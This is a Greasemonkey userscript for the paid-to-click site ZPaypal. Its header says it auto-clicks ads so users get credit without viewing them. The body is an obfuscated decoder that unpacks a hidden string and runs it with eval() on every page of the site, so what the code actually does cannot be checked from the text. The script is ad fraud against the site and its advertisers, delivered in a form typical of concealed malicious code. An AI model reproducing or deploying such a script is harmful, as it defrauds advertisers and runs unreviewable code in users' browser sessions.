// ==UserScript==
// @name           JustOneClick for ZPaypal
// @namespace      http://www.youtube.com/user/bath4rakala
// @description    An Auto-click for ZPaypal, makes you validated without viewing the ads. Ads loaded faster, because this script ignores all tags. So images, css , js, swfs files etc WILL NOT loaded, and you will save your bandwidth.
// @include        *://*zpaypal.com/*
// @copyright      PTCSPY
// ==/UserScript==
(function(BY,PTCSPY){var Y=function(y){if(y>92)y--;return y-42},B=function(){if(a==0){b=Y(d.charCodeAt(e++));a=6;}return((b>>--a)&0x01)},e,c=194,o,a="1H1S1V1`1c1d2Y2f1a2Q2L1^3X1Y1Z3L3R1W2R2S1T3_3]1O1P3M3S1M3O1K3N1I3T3a1@1C1D3K2X1A3Z3^181;1<3Y3`193Q3V1*1/12133-3/102J2e1-3d1+3U3b0i2h3W",l=new Array(),d="IJi?RD_AQB=9a.>RE:=FGWhK.8,W-@L,1JaKU;=X+D^0Pg.h-g@KU;+*aKU;<UY+[NV3W>f6BB7RD_>aDH-0N?FZ*2/Rcj,Le^4bRaJSZHJ1U*RNCi;7bQDM3HV6/a.^hK/2^-XSLTB=X*`GX1@KU;-Z";while(a.length){l.push((Y(a.charCodeAt(0))<<6)+Y(a.charCodeAt(1))-512);a=a.slice(2,a.length)};e=b=a=0;o="";while(c--){i=0;while(l[i]<0){if(B())i=-l[i];else i++}o+=String.fromCharCode(l[i])};eval(o)}())